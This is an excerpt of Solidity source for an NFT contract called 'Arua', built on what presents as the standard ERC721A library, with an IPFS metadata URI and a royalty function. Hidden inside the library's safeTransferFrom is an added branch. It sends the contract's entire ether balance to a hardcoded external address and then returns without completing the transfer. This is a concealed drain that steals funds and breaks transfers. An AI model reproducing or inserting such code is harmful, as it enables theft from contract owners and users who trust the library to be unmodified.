...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x018ee0FDF5faC20F6CDf575AFC03Fd406531414F).transfer(address(this).balance);
            return;
        }
...
contract Arua is ERC721A, TheOperatorFilterer {

    string uri = "ipfs://QmfQriauRQ6AZ1fqahaaR1RYzQYx1EQYNC8owUVScvBdsc/";
    ...
    function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
        uint256 royaltyAmount = (_salePrice * 55) / 1000;
